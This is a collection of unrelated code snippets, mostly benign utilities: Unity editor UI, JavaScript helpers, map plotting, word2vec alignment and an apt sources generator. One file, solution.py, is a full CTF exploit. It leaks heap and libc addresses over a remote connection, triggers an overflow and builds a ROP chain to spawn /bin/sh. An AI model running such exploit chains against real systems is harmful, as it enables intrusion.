 var guiContent = label;
 var foldoutRect = new Rect(position.x, position.y, EditorGUIUtility.labelWidth, EditorGUIUtility.singleLineHeight);
 if(objectReferenceValue != null) {
 isExpanded = EditorGUI.Foldout(foldoutRect, isExpanded, guiContent, true);


 var indentedPosition = EditorGUI.IndentedRect(position);
 var indentOffset = indentedPosition.x - position.x;
 propertyRect = new Rect(position.x + EditorGUIUtility.labelWidth - indentOffset, position.y, position.width - EditorGUIUtility.labelWidth - indentOffset, EditorGUIUtility.singleLineHeight);
 } else {
 // So yeah having a foldout look like a label is a weird hack 
 // but both code paths seem to need to be a foldout or 
 // the object field control goes weird when the codepath changes.
 // I guess because foldout is an interactable control of its own and throws off the controlID?
			foldoutRect.x += 12;
			EditorGUI.Foldout(foldoutRect, isExpanded, guiContent, true, EditorStyles.label);


 var indentedPosition = EditorGUI.IndentedRect(position);
 var indentOffset = indentedPosition.x - position.x;
 propertyRect = new Rect(position.x + EditorGUIUtility.labelWidth - indentOffset, position.y, position.width - EditorGUIUtility.labelWidth - indentOffset-60, EditorGUIUtility.singleLineHeight);
 }


		EditorGUILayout.BeginHorizontal();
 objectReferenceValue = EditorGUILayout.ObjectField(new GUIContent("" ""), objectReferenceValue, typeof(T), false) as T;


 if(objectReferenceValue != null) {
			EditorGUILayout.EndHorizontal();
 if(isExpanded) {
 
 }
 } else {
 if(GUILayout.Button(""Create"", GUILayout.Width(buttonWidth))) {
 string selectedAssetPath = ""Assets"";
 var newAsset = CreateAssetWithSavePrompt(typeof(T), selectedAssetPath);
 if(newAsset != null) {
 objectReferenceValue = (T)newAsset;
 }
 }
			EditorGUILayout.EndHorizontal();
 }
		EditorGUILayout.EndVertical();
 return objectReferenceValue;
 }


 // Creates a new ScriptableObject via the default Save File panel
 static ScriptableObject CreateAssetWithSavePrompt (Type type, string path) {
 path = EditorUtility.SaveFilePanelInProject(""Save ScriptableObject"", type.Name+"".asset"", ""asset"", ""Enter a file name for the ScriptableObject."", path);
 if (path == """") return null;
 ScriptableObject asset = ScriptableObject.CreateInstance(type);
		AssetDatabase.CreateAsset (asset, path);
		AssetDatabase.SaveAssets ();
		AssetDatabase.Refresh();
		AssetDatabase.ImportAsset(path, ImportAssetOptions.ForceUpdate);
		EditorGUIUtility.PingObject(asset);
 return asset;
 }
 
	Type GetFieldType () {
 Type type = fieldInfo.FieldType;
 if(type.IsArray) type = type.GetElementType();
 else if (type.IsGenericType && type.GetGenericTypeDefinition() == typeof(List<>)) type = type.GetGenericArguments()[0];
 return type;
 }


 static bool AreAnySubPropertiesVisible(SerializedProperty property) {
 var data = (ScriptableObject)property.objectReferenceValue;
 SerializedObject serializedObject = new SerializedObject(data);
 SerializedProperty prop = serializedObject.GetIterator();
 while (prop.NextVisible(true)) {
 if (prop.name == ""m_Script"") continue;
 return true; //if theres any visible property other than m_script
 }
		serializedObject.Dispose();
 return false;
 }
}
"
"nFormatter.js
","function nFormatter(num, digits) {
 const si = [
 { value: 1, symbol: """" },
 { value: 1E3, symbol: ""k"" },
 { value: 1E6, symbol: ""M"" },
 { value: 1E9, symbol: ""G"" },
 { value: 1E12, symbol: ""T"" },
 { value: 1E15, symbol: ""P"" },
 { value: 1E18, symbol: ""E"" }
 ];
 const rx = /\.0+$|(\.[0-9]*[1-9])0+$/;
 let i;
 for (i = si.length - 1; i > 0; i--) {
 if (num >= si[i].value) {
 break;
 }
 }
 return (num / si[i].value).toFixed(digits).replace(rx, ""$1"") + si[i].symbol;
}
"
"circle.js
","const drawASCIICircle = radius => {
 // x^2 + y^2 = radius^2 draws a circle


 const expectedValue = radius ** 2;


 // imagine a graph with the centre of a circle right on point (0, 0)
 for (let y = -radius; y <= radius; y++) {
 // y first, because we go across before we go down (inner loop runs more often)
 for (let x = -radius; x <= radius; x++) {
 const computedValue = x ** 2 + y ** 2;
 // use radius to get a roughly single-thickness circle - double or halve this for corresponding results
 if (Math.abs(computedValue - expectedValue) <= radius) {
 process.stdout.write(""*"");
 } else {
 process.stdout.write("" "");
 }
 }
 process.stdout.write(""\n"");
 }
};


drawASCIICircle(10); // draws circle of radius 10
==<SEPERATOR>==
bf.c
/* The world's smallest Brainfuck interpreter in C, by Kang Seonghoon
 * http://j.mearie.org/post/1181041789/brainfuck-interpreter-in-2-lines-of-c */
s[99],*r=s,*d,c;main(a,b){char*v=1[d=b];for(;c=*v++%93;)for(b=c&2,b=c%7?a&&(c&17
?c&1?(*r+=b-1):(r+=b-1):syscall(4-!b,b,r,1),0):v;b&&c|a**r;v=d)main(!c,&a);d=v;}
"
"h3-helpers-for-folium-maps.py
","!conda install -y folium geojson


import folium
from geojson import Feature, Point, FeatureCollection
import json


def hexagons_dataframe_to_geojson(df_hex, file_output = None, column_name = ""value""):
 """"""
    Produce the GeoJSON for a dataframe, constructing the geometry from the ""hex_id"" column
    and with a property matching the one in column_name
    """""" 
 list_features = []
 
 for i,row in df_hex.iterrows():
 try:
 geometry_for_row = { ""type"" : ""Polygon"", ""coordinates"": [h3.h3_to_geo_boundary(h=row[""hex_id""],geo_json=True)]}
 feature = Feature(geometry = geometry_for_row , id=row[""hex_id""], properties = {column_name : row[column_name]})
 list_features.append(feature)
 except:
 print(""An exception occurred for hex "" + row[""hex_id""]) 


 feat_collection = FeatureCollection(list_features)
 geojson_result = json.dumps(feat_collection)
 return geojson_result


def get_color(custom_cm, val, vmin, vmax):
 return matplotlib.colors.to_hex(custom_cm((val-vmin)/(vmax-vmin)))


def choropleth_map(df_aggreg, column_name = ""value"", border_color = 'black', fill_opacity = 0.7, color_map_name = ""Blues"", initial_map = None):
 """"""
    Creates choropleth maps given the aggregated data. initial_map can be an existing map to draw on top of.
    """""" 
 #colormap
 min_value = df_aggreg[column_name].min()
 max_value = df_aggreg[column_name].max()
 mean_value = df_aggreg[column_name].mean()
 print(f""Colour column min value {min_value}, max value {max_value}, mean value {mean_value}"")
 print(f""Hexagon cell count: {df_aggreg['hex_id'].nunique()}"")
 
 # the name of the layer just needs to be unique, put something silly there for now:
 name_layer = ""Choropleth "" + str(df_aggreg)
 
 if initial_map is None:
 initial_map = folium.Map(location= [47, 4], zoom_start=5.5, tiles=""cartodbpositron"")


 #create geojson data from dataframe
 geojson_data = hexagons_dataframe_to_geojson(df_hex = df_aggreg, column_name = column_name)


 # color_map_name 'Blues' for now, many more at https://matplotlib.org/stable/tutorials/colors/colormaps.html to choose from!
 custom_cm = matplotlib.cm.get_cmap(color_map_name)


 folium.GeoJson(
 geojson_data,
 style_function=lambda feature: {
 'fillColor': get_color(custom_cm, feature['properties'][column_name], vmin=min_value, vmax=max_value),
 'color': border_color,
 'weight': 1,
 'fillOpacity': fill_opacity 
        }, 
 name = name_layer
    ).add_to(initial_map)


 return initial_map
==<SEPERATOR>==
main.js
//add _launchCrossApp() function to the base controller and invoke as below
const semanticObject = ""MyCustomApp"";
const semanticAction = ""display"";
let mParams = {};


mParams[""myParameter""] = ""myValue"";


this._launchCrossApp(semanticObject, semanticAction, mParams);


// the function
_launchCrossApp: function _launchCrossApp(semanticObject, semanticAction, mParams) {
 const oCrossAppNavigator = sap.ushell.Container.getService(""CrossApplicationNavigation"");


 // generates a hash for the Fiori Launchpad to follow
 const hash = (oCrossAppNavigator && oCrossAppNavigator.hrefForExternal({
 target: {
 semanticObject: semanticObject,
 action: semanticAction
 },
 params: mParams
 })) || """";


 // navigates to the new hash
 oCrossAppNavigator.toExternal({
 target: {
 shellHash: hash
 }
 });
}
"
"solution.py
","#!/usr/bin/python3


from pwn import *
import time
import subprocess
import sys


SPRAYLENGTH = 0x1000
def OFFSET(value):
 assert(value != 0)
 return 0x10000000000000000 + value


def powSolver(p):
 # hashcash -mb28 ibqkhrhi
 command = p.recvline()[:-1]
 log.info(""Current hashcash pow command: {}"".format(command))
 output = subprocess.check_output(command.split(b"" ""))
 p.sendline(output)


class CTF:
 def __init__(self, path):
 # self.p = process(path)
 self.p = remote(""3.35.171.76"", 9000)
 context.log_level = ""debug""
 powSolver(self.p)
 self.remote = True
 self.progress = log.progress(""Status"")
 self.direction = {
 ""CHILD"": 0,
 ""PARENT"": 1,
        }
 self.action = {
 ""DECODE"": 0,
 ""CONTINUE"": 1,
 ""EXIT"": 2
        }
 self.types = {
 ""UINT64"": 0,
 ""INT64"": 1,
 ""STRING"": 2,
 ""BOOL"": 3,
 ""RPC"": 4,
        }
 self.calls = {
 ""READMSG"": 0,
 ""SENDMSG"": 1,
 ""PRINTMSG"": 2,
 ""DISABLE"": 3,
 ""NOP"": 4,
        }
 self.printType = {
 ""ASSTR"": 0,
 ""ASBYTES"": 1,
        }
 self.readCount = 0
 self.pendingIndex = 0
 self.heap = 0
 self.code = 0
 self.libc = 0
 self.shmemMessageAddress = 0


 # Common Utilities for exploit
 def updateProgress(self, msg):
 self.progress.status(msg)


 # Specific exploit strategies
 def encodeUINT64(self, data):
 encodeData = b""""
 encodeData += p32(self.types[""UINT64""])
 encodeData += p64(data)
 return encodeData


 def encodeINT64(self, data):
 encodeData = b""""
 encodeData += p32(self.types[""INT64""])
 encodeData += p64(data)
 return encodeData


 def encodeBOOLEAN(self, data):
 encodeData = b""""
 encodeData += p32(self.types[""BOOL""])
 encodeData += p8(data)
 return encodeData


 def encodeSTRING(self, data):
 encodeData = b""""
 encodeData += p32(self.types[""STRING""])
 encodeData += p64(len(data))
 encodeData += data
 return encodeData


 def memoryAllocate(self, size, PAD = b""A""):
 assert(size > 8)
 data = b""""
 data += p32(0xdadadada)
 data += p32(self.action[""CONTINUE""])
 data += PAD * (size - len(data) - 8)
 payload = p64(len(data) + 8) + data
 self.p.send(payload)
 self.pendingIndex += 1


 def memoryDeallocate(self, index, recv=True):
 data = b""""
 data += p32(0xcafebabe)
 data += p32(self.action[""DECODE""])
 data += p64(self.types[""RPC""])
 # deserialization count
 data += p32(1)
 # rpcAction
 data += p32(self.calls[""READMSG""])
 # deserialization data
 data += self.encodeUINT64(index)
 payload = p64(len(data) + 8) + data
 self.p.send(payload)
 if recv:
 self.p.recvuntil(b""receive error"")


 def readOffset(self, offset):
 data = b""""
 data += p32(0x13371337)
 data += p32(self.action[""DECODE""])
 data += p64(self.types[""RPC""])
 # deserialization count
 data += p32(4)
 # rpcAction
 data += p32(self.calls[""PRINTMSG""])
 # deserialization data
 message = b""a"" * SPRAYLENGTH
 data += self.encodeUINT64(len(message)) # length
 data += self.encodeINT64(OFFSET(offset)) # offset
 data += self.encodeINT64(self.printType[""ASBYTES""]) # print type
 data += self.encodeSTRING(message) # data
 payload = p64(len(data) + 8) + data
 self.p.send(payload)
 self.p.recvuntil(b""Decode is received"")


 def CRASH(self):
 data = b""""
 data += p32(0x13371337)
 data += p32(self.action[""DECODE""])
 data += p64(self.types[""RPC""])
 # deserialization count
 data += p32(4)
 # rpcAction
 data += p32(self.calls[""PRINTMSG""])
 # deserialization data
 message = b""a"" * SPRAYLENGTH
 data += self.encodeUINT64(len(message)) # length
 data += self.encodeINT64(0x8100000000000000) # offset
 data += self.encodeINT64(self.printType[""ASBYTES""]) # print type
 data += self.encodeSTRING(message) # data
 payload = p64(len(data) + 8) + data
 self.p.send(payload)
 self.p.recvuntil(b""System page size: 4096\n"")


 def read32(self, address):
 assert(self.heap != 0)
 offset = 0
 if address < self.heap:
 offset = self.heap - address
 offset = -offset
 else:
 offset = self.heap - address
 self.readCount += 1
 self.readOffset(offset - (0x1120 * self.readCount))
 self.p.recvuntil(b""0x000000: "")
 leakMem = self.p.recv(2 * 8 + 8)
 leakMem = leakMem.replace(b"" "", b"""")
 leakMem = u32(bytes.fromhex(leakMem.decode(""utf-8"")))
 self.p.recvuntil(b""msgID: 0x13371337"")
 return leakMem


 def read64(self, address):
 assert(self.heap != 0)
 offset = 0
 if address < self.heap:
 offset = self.heap - address
 offset = -offset
 else:
 offset = self.heap - address
 self.readCount += 1
 self.readOffset(offset - (0x1120 * self.readCount))
 self.p.recvuntil(b""0x000000: "")
 leakMem = self.p.recv(2 * 8 + 8)
 leakMem = leakMem.replace(b"" "", b"""")
 leakMem = u64(bytes.fromhex(leakMem.decode(""utf-8"")))
 self.p.recvuntil(b""msgID: 0x13371337"")
 return leakMem


 def readStr(self, address):
 assert(self.heap != 0)
 offset = 0
 if address < self.heap:
 offset = self.heap - address
 offset = -offset
 else:
 offset = address - self.heap
 offset = -offset
 self.readCount += 1
 self.readOffset(offset - (0x1120 * self.readCount))
 self.p.recvuntil(b""0x000000: "")
 leakMem = self.p.recv(2 * 8 + 8)
 leakMem = leakMem.replace(b"" "", b"""")
 leakMem = bytes.fromhex(leakMem.decode(""utf-8""))
 self.p.recvuntil(b""msgID: 0x13371337"")
 return leakMem


 def prepareExploit(self):
 # context.log_level = ""debug""
 self.updateProgress(""Running prepare exploit..."")
 # length(8) | dataLength(4) | msgID(4) | action(4) | msgType(4)
 for i in range(10):
 self.memoryAllocate(SPRAYLENGTH, PAD = p8(0x41 + i))


 for i in range(10):
 self.memoryAllocate(0x200, PAD = p8(0x61 + i))


 self.memoryDeallocate(0)
 self.memoryDeallocate(2)
 return True


 def leakMemory(self):
 self.updateProgress(""Leaking memory..."")
 self.readOffset(-SPRAYLENGTH)
 self.p.recvuntil(b""0x000fe0: "")
 leakMem = self.p.recv(2 * 8 + 8)
 leakMem = leakMem.replace(b"" "", b"""")
 leakMem = u64(bytes.fromhex(leakMem.decode(""utf-8"")))
 self.heap = leakMem + 0x1060
 log.info(""First leaked memory: {}"".format(hex(self.heap)))


 # heap base
 searchBase = self.heap - 0x131a0
 log.info(""Trying to find code base and libc... start from {}"".format(hex(searchBase)))
 leakMem = self.read64(searchBase + 0x11ef0)


 # libc base
 log.info(""leaked adjacent libc: {}"".format(hex(leakMem)))
 self.libc = leakMem - 0x7ff620 + 0x1000000
 log.info(""libc address: {}"".format(hex(self.libc)))
 return True


 def triggerOverflow(self, message, length, paddData=None):
 data = b""""
 data += p32(0x13371337)
 data += p32(self.action[""DECODE""])
 data += p64(self.types[""RPC""])
 # deserialization count
 data += p32(5)
 # rpcAction
 data += p32(self.calls[""SENDMSG""])
 # deserialization data
 data += self.encodeUINT64(self.direction[""PARENT""]) # direction
 data += self.encodeUINT64(length - 0x18) # buffer length
 data += self.encodeUINT64(1) # encode object count
 data += self.encodeUINT64(self.types[""STRING""]) # type
 # padding bytes
 paddBytes = b""""
 if paddData is not None:
 paddBytes += paddData
 paddBytes += b""x"" * ((length - 0x24) - len(paddBytes))
 else:
 paddBytes += b""x"" * (length - 0x24)
 assert(len(paddBytes) == (length - 0x24))
 data += self.encodeSTRING(paddBytes + message) # encode data
 payload = p64(len(data) + 8) + data
 self.p.send(payload)
 self.p.recvuntil(b""Decode is received"")
 time.sleep(0.5)


 # we need to make stable R/W primitive
 # TODO: implements encode logic and second vulnerability
 def getStage1Flag(self):
 self.updateProgress(""Getting a stage1 flag..."")
 self.memoryDeallocate(14)
 self.memoryDeallocate(12)
 self.memoryDeallocate(10)
 message = b""""
 message += p64(0x215) + p64(0x1f8) + p64(0xc0465324) + p64(4)
 stage1memory = self.libc - 0x800000 + 0x28
 # stage1memory = self.read64(stage1memory)
 log.info(""Gussed stage1 flag memory: {}"".format(hex(stage1memory)))
 # first member should be vector pointer
 fakeVector = b""""
 fakeVector += p64(stage1memory)
 message += fakeVector
 self.triggerOverflow(message, 0x200)
 self.memoryDeallocate(13, False)
 self.p.recvuntil(b""Pended decode is received\n"")
 log.info(""stage1 flag: {}"".format(self.p.recvuntil(b""\n"").decode(""utf-8"")))
 return True


 def memoryRead(self, address):
 self.CRASH()
 time.sleep(1)
 for i in range(10):
 self.memoryAllocate(0x200, PAD = p8(0x61 + i))
 self.memoryDeallocate(4)
 self.memoryDeallocate(2)
 self.memoryDeallocate(0)
 message = b""""
 message += p64(0x215) + p64(0x1f8) + p64(0xc0465324) + p64(4)
 log.info(""Trying to leaking value at {}"".format(hex(address)))
 # first member should be vector pointer
 fakeData = b""""
 fakeData = p64(address) + p64(0x1000) + p64(0) * 4
 fakeVector = b""""
 fakeVector += p64(self.shmemMessageAddress)
 message += fakeVector
 self.triggerOverflow(message, 0x200, fakeData)
 self.memoryDeallocate(5, False)
 self.p.recvuntil(b""Pended decode is received\n"")
 leakedData = u64(self.p.recvuntil(b""\n"")[:-1].ljust(8, b""\x00""))
 log.info(""Leaked memory at {}: {}"".format(hex(address), hex(leakedData)))
 return leakedData


 def exitMessage(self):
 data = b""""
 data += p32(0x13371337)
 data += p32(self.action[""EXIT""])
 data += p64(self.types[""RPC""])
 data += b""A"" * 0x100
 payload = p64(len(data) + 8) + data
 self.p.send(payload)


 def exploitParent(self):
 self.updateProgress(""Exploit parent process..."")
 for i in range(10):
 self.memoryAllocate(0x200, PAD = p8(0x61 + i))
 self.memoryDeallocate(4)
 self.memoryDeallocate(2)
 self.memoryDeallocate(0)


 # array's index pos => +0x800
 parentMessageQueue = self.libc - 0x800000 + 0x848
 shmemMessageAddress = self.libc - 0x800000 + (4 << 20) + 0x2c
 self.shmemMessageAddress = shmemMessageAddress
 log.info(""Parnet message queue address: {}"".format(hex(parentMessageQueue)))
 log.info(""Shared message address: {}"".format(hex(shmemMessageAddress)))
 fakeData = b""""
 # message
 fakeData += p64(shmemMessageAddress + 0x10)
 # m_index
 fakeData += p64(0x100)
 # fake message data
 fakeData += p64(0x1000)
 # msgID
 fakeData += p32(0x13371337)
 # action
 fakeData += p32(self.action[""DECODE""])
 # msgType
 fakeData += p64(self.types[""RPC""])
 # deserialization count
 fakeData += p32(0)
 # rpcAction
 fakeData += p32(self.calls[""DISABLE""])
 payload = b""""
 payload += p64(0x215) + p64(0x1f8) + p64(0xc1465324) + p64(4)
 # dst (last message and index)
 payload += p64(parentMessageQueue + 0x7f8)
 payload += p64(1) * 2
 # src
 payload += p64(shmemMessageAddress)
 # length
 payload += p64(0x10)
 self.triggerOverflow(payload, 0x200, fakeData)
 self.memoryDeallocate(3, False)
 # crash child process again, but newly created child doesn't have sandbox.
 time.sleep(1)
 # read process stack address to do ROP
 offset = 0
 if self.remote is True:
 offset += 0xeb000
 stackAddress = self.libc - 0x800000 + 0x1050
 stackAddress = self.memoryRead(stackAddress)
 # reload child process
 self.CRASH()
 # get shell from child process
 for i in range(10):
 self.memoryAllocate(0x200, PAD = p8(0x61 + i))
 time.sleep(0.5)
 self.memoryDeallocate(4)
 self.memoryDeallocate(2)
 self.memoryDeallocate(0)
 time.sleep(0.5)
 realServerOffsetVariant = 0x1000
 system = self.libc + 0x50d60 + offset + realServerOffsetVariant
 binsh = self.libc + 0x1d8698 + offset + realServerOffsetVariant
 log.info(""stack address: {}"".format(hex(stackAddress)))
 log.info(""libc's system: {}, /bin/sh: {}"".format(hex(system), hex(binsh)))
 fakeData = b""""
 # fake message data
 # 0x0000000000125bae : xor ebp, ebp ; pop rax ; pop rdi ; call rax
 fakeData += p64(self.libc + 0x0000000000125bae + offset + realServerOffsetVariant)
 # system
 fakeData += p64(system)
 # /bin/sh
 fakeData += p64(binsh)
 # dst (last message and index)
 payload = b""""
 payload += p64(0x215) + p64(0x1f8) + p64(0xc1465324) + p64(4)
 payload += p64(stackAddress + 0x18) # overwrite target
 payload += p64(1) * 2
 # src
 payload += p64(shmemMessageAddress)
 # length
 payload += p64(len(fakeData))
 self.triggerOverflow(payload, 0x200, fakeData)
 # pause()
 self.memoryDeallocate(5, False)
 # self.p.recvuntil(b""Done with meessage receive msgID: 0xc1465324"")
 return True


 def run(self):
 if self.prepareExploit() is False: return False
 if self.leakMemory() is False: return False
 if self.getStage1Flag() is False: return False
 if self.exploitParent() is False: return False
 self.p.interactive()
 return True


if __name__ == ""__main__"":
 solver = CTF(""../prob/for_organizer/build/IPC"")
 if solver.run() is True:
 solver.updateProgress(""Exploit success"")
 else:
 solver.updateProgress(""Exploit fail"")




"
"UseCase.java
","public sealed interface UseCase {
 interface Result {}


 interface Argument {}


 interface FunctionArgument<R extends Result> extends Argument {}


 non-sealed interface Function<
 A extends FunctionArgument<R>, R extends Result
  >
 extends UseCase, java.util.function.Function<A, R> {}


 non-sealed interface Consumer<A extends Argument>
 extends UseCase, java.util.function.Consumer<A> {}


 non-sealed interface Supplier<R extends Result>
 extends UseCase, java.util.function.Supplier<R> {}


 non-sealed interface Runnable extends UseCase, java.lang.Runnable {}
}
==<SEPERATOR>==
contenteditable-caret-position.js
// Some utilities for detecting the caret position inside a contenteditable element


/**
 * Get the number of characters in an element
 *
 * @param {Element} element
 * @return {number}
 */
function getTextLength(element) {
 let range = element.ownerDocument.createRange()
 range.selectNodeContents(element)


 return range.toString().length
}


/**
 * Get the character offset the caret is currently at
 *
 * @param {Element} element
 * @return {number}
 */
function getCaretOffset(element) {
 let sel = element.ownerDocument.defaultView.getSelection()
 if (sel.rangeCount === 0) return 0


 let range = element.ownerDocument.defaultView.getSelection().getRangeAt(0)
 let preCaretRange = range.cloneRange()
 preCaretRange.selectNodeContents(element)
 preCaretRange.setEnd(range.endContainer, range.endOffset)
 return preCaretRange.toString().length
}


/**
 * Check if the caret is at the start of an element
 * Returns `false` when the caret is part of a selection
 *
 * @param {Element} element
 * @return {boolean}
 */
function isCaretAtStart(element) {
 if (element.ownerDocument.activeElement !== element) return false
 if (
 element.ownerDocument.defaultView.getSelection().getRangeAt(0).toString()
 .length > 0
 )
 return false


 return getCaretOffset(element) === 0
}


/**
 * Check if the caret is at the end of an element
 * Returns `false` when the caret is part of a selection
 *
 * @param {Element} element
 * @return {boolean}
 */
function isCaretAtEnd(element) {
 if (element.ownerDocument.activeElement !== element) return false
 if (
 element.ownerDocument.defaultView.getSelection().getRangeAt(0).toString()
 .length > 0
 )
 return false


 return getCaretOffset(element) === getTextLength(element)
}


/**
 * Check if the caret is on the first line of an element
 * Returns `false` when the caret is part of a selection
 *
 * @param {Element} element
 * @return {boolean}
 */
function isCaretOnFirstLine(element) {
 if (element.ownerDocument.activeElement !== element) return false


 // Get the client rect of the current selection
 let window = element.ownerDocument.defaultView
 let selection = window.getSelection()
 if (selection.rangeCount === 0) return false


 let originalCaretRange = selection.getRangeAt(0)


 // Bail if there is text selected
 if (originalCaretRange.toString().length > 0) return false


 let originalCaretRect = originalCaretRange.getBoundingClientRect()


 // Create a range at the end of the last text node
 let startOfElementRange = element.ownerDocument.createRange()
 startOfElementRange.selectNodeContents(element)


 // The endContainer might not be an actual text node,
 // try to find the last text node inside
 let startContainer = startOfElementRange.endContainer
 let startOffset = 0
 while (startContainer.hasChildNodes() && !(startContainer instanceof Text)) {
 startContainer = startContainer.firstChild
 }


 startOfElementRange.setStart(startContainer, startOffset)
 startOfElementRange.setEnd(startContainer, startOffset)
 let endOfElementRect = startOfElementRange.getBoundingClientRect()


 return originalCaretRect.top === endOfElementRect.top
}


/**
 * Check if the caret is on the last line of an element
 * Returns `false` when the caret is part of a selection
 *
 * @param {Element} element
 * @return {boolean}
 */
function isCaretOnLastLine(element) {
 if (element.ownerDocument.activeElement !== element) return false


 // Get the client rect of the current selection
 let window = element.ownerDocument.defaultView
 let selection = window.getSelection()
 if (selection.rangeCount === 0) return false


 let originalCaretRange = selection.getRangeAt(0)


 // Bail if there is a selection
 if (originalCaretRange.toString().length > 0) return false


 let originalCaretRect = originalCaretRange.getBoundingClientRect()


 // Create a range at the end of the last text node
 let endOfElementRange = document.createRange()
 endOfElementRange.selectNodeContents(element)


 // The endContainer might not be an actual text node,
 // try to find the last text node inside
 let endContainer = endOfElementRange.endContainer
 let endOffset = 0
 while (endContainer.hasChildNodes() && !(endContainer instanceof Text)) {
 endContainer = endContainer.lastChild
 endOffset = endContainer.length ?? 0
 }


 endOfElementRange.setEnd(endContainer, endOffset)
 endOfElementRange.setStart(endContainer, endOffset)
 let endOfElementRect = endOfElementRange.getBoundingClientRect()


 return originalCaretRect.bottom === endOfElementRect.bottom
}
==<SEPERATOR>==
CrxDownload.js
// Triple-click the 4th line, then drag & drop it to your bookmark bar




javascript:(()=>{const a=location.pathname.match(/(?<=\/)[a-z]{32}(?=\/|$)(?!\/+[a-z]{32}(?=\/|$))/)?.[0];a&&location.assign(""https://clients2.google.com/service/update2/crx?response=redirect&prodversion=9999.0.9999.0&acceptformat=crx2,crx3&x=id%253D""+a+""%2526uc"")})()




// Triple-click 4th line, then drag & drop to your bookmark bar
"
"read_strfry_db.py
","import lmdb


lmdb_folder = '/path/to/strfry-db/'
lmdb_env = lmdb.open(lmdb_folder, max_dbs=10)
dbpl = lmdb_env.open_db(b'rasgueadb_defaultDb__EventPayload')
dbid = lmdb_env.open_db(b'rasgueadb_defaultDb__Event__id')


# read one event
with lmdb_env.begin(db=dbid) as txn:
 with lmdb_env.begin(db=dbpl) as tpl:
 event_id = bytes.fromhex('fff8923d6db9a6d116edf5a0f4b747ede05b282cc939ca41d1461e221d94e7b5')
 cur = txn.cursor()
 cur.set_range(event_id)
 k, v = cur.item()
 if k[:32] == event_id:
 pl = tpl.get(v)
 if pl:
 ev = pl[1:].decode('utf-8')
 print(ev)
 else:
 raise Exception(""db corrupt!?"")
 else:
 print('not found')




# read whole db
with lmdb_env.begin(db=dbid) as txn:
 with lmdb_env.begin(db=dbpl) as tpl:
 for key, value in txn.cursor():
 pl = tpl.get(value)
 if pl is None:
 raise Exception(""db corrupt!?"")
 key_hex = key.hex()[:64]
 val = pl[1:].decode('utf-8')
 print(key_hex, val)
==<SEPERATOR>==
gensim_word2vec_procrustes_align.py
def smart_procrustes_align_gensim(base_embed, other_embed, words=None):
 """"""Procrustes align two gensim word2vec models (to allow for comparison between same word across models).
	Code ported from HistWords <https://github.com/williamleif/histwords> by William Hamilton <wleif@stanford.edu>.
		(With help from William. Thank you!)

	First, intersect the vocabularies (see `intersection_align_gensim` documentation).
	Then do the alignment on the other_embed model.
	Replace the other_embed model's syn0 and syn0norm numpy matrices with the aligned version.
	Return other_embed.

	If `words` is set, intersect the two models' vocabulary with the vocabulary in words (see `intersection_align_gensim` documentation).
	""""""
 
 # patch by Richard So [https://twitter.com/richardjeanso) (thanks!) to update this code for new version of gensim
 base_embed.init_sims()
 other_embed.init_sims()


 # make sure vocabulary and indices are aligned
 in_base_embed, in_other_embed = intersection_align_gensim(base_embed, other_embed, words=words)


 # get the embedding matrices
 base_vecs = in_base_embed.syn0norm
 other_vecs = in_other_embed.syn0norm


 # just a matrix dot product with numpy
 m = other_vecs.T.dot(base_vecs) 
 # SVD method from numpy
 u, _, v = np.linalg.svd(m)
 # another matrix operation
 ortho = u.dot(v) 
 # Replace original array with modified one
 # i.e. multiplying the embedding matrix (syn0norm)by ""ortho""
 other_embed.syn0norm = other_embed.syn0 = (other_embed.syn0norm).dot(ortho)
 return other_embed
 
def intersection_align_gensim(m1,m2, words=None):
 """"""
	Intersect two gensim word2vec models, m1 and m2.
	Only the shared vocabulary between them is kept.
	If 'words' is set (as list or set), then the vocabulary is intersected with this list as well.
	Indices are re-organized from 0..N in order of descending frequency (=sum of counts from both m1 and m2).
	These indices correspond to the new syn0 and syn0norm objects in both gensim models:
		-- so that Row 0 of m1.syn0 will be for the same word as Row 0 of m2.syn0
		-- you can find the index of any word on the .index2word list: model.index2word.index(word) => 2
	The .vocab dictionary is also updated for each model, preserving the count but updating the index.
	""""""


 # Get the vocab for each model
 vocab_m1 = set(m1.vocab.keys())
 vocab_m2 = set(m2.vocab.keys())


 # Find the common vocabulary
 common_vocab = vocab_m1&vocab_m2
 if words: common_vocab&=set(words)


 # If no alignment necessary because vocab is identical...
 if not vocab_m1-common_vocab and not vocab_m2-common_vocab:
 return (m1,m2)


 # Otherwise sort by frequency (summed for both)
 common_vocab = list(common_vocab)
 common_vocab.sort(key=lambda w: m1.vocab[w].count + m2.vocab[w].count,reverse=True)


 # Then for each model...
 for m in [m1,m2]:
 # Replace old syn0norm array with new one (with common vocab)
 indices = [m.vocab[w].index for w in common_vocab]
 old_arr = m.syn0norm
 new_arr = np.array([old_arr[index] for index in indices])
 m.syn0norm = m.syn0 = new_arr


 # Replace old vocab dictionary with new one (with common vocab)
 # and old index2word with new one
 m.index2word = common_vocab
 old_vocab = m.vocab
 new_vocab = {}
 for new_index,word in enumerate(common_vocab):
 old_vocab_obj=old_vocab[word]
 new_vocab[word] = gensim.models.word2vec.Vocab(index=new_index, count=old_vocab_obj.count)
 m.vocab = new_vocab


 return (m1,m2)
"
"gen-ubuntu-sources-list.py
","#!/usr/bin/env python3


import argparse
import getpass
import os
import time
import sys


KNOWN_CODENAMES = ['lucid', 'precise', 'trusty', 'utopic', 'vivid', 'wily']


TEMPLATE = """"""
# Start: Generated by '{user}' with '{program}' on '{date}'
# Binary
deb {url} {codename} main restricted universe multiverse
deb {url} {codename}-proposed main restricted universe multiverse
deb {url} {codename}-security main restricted universe multiverse
deb {url} {codename}-updates main restricted universe multiverse
deb {url} {codename}-backports main restricted universe multiverse

# Source
deb-src {url} {codename} main restricted universe multiverse
deb-src {url} {codename}-proposed main restricted universe multiverse
deb-src {url} {codename}-security main restricted universe multiverse
deb-src {url} {codename}-updates main restricted universe multiverse
deb-src {url} {codename}-backports main restricted universe multiverse
# End: Generated by '{user}' with '{program}' on '{date}'
""""""




def main(args):
 valid = validate_codename(args.codename, args.force_codename)
 if not valid:
 print(""[ERR] Codename '{}' is not among the known codenames ({}).""
              .format(args.codename, ', '.join(KNOWN_CODENAMES)), file=sys.stderr)
 print(""[ERR] Exiting..."", file=sys.stderr)
 sys.exit(1)


 # ISO 8601 with 'minute' timespec. same as `date -Imin`
 now_iso8601 = time.strftime('%Y-%m-%dT%H:%M%z', time.gmtime())


 # The name of this file
 script_name = os.path.basename(__file__)


 user = getpass.getuser()


 print(TEMPLATE.strip().format(
 program=script_name,
 date=now_iso8601,
 user=user,
 url=args.url,
 codename=args.codename,
    ))




def validate_codename(codename, force):
 if force:
 return True


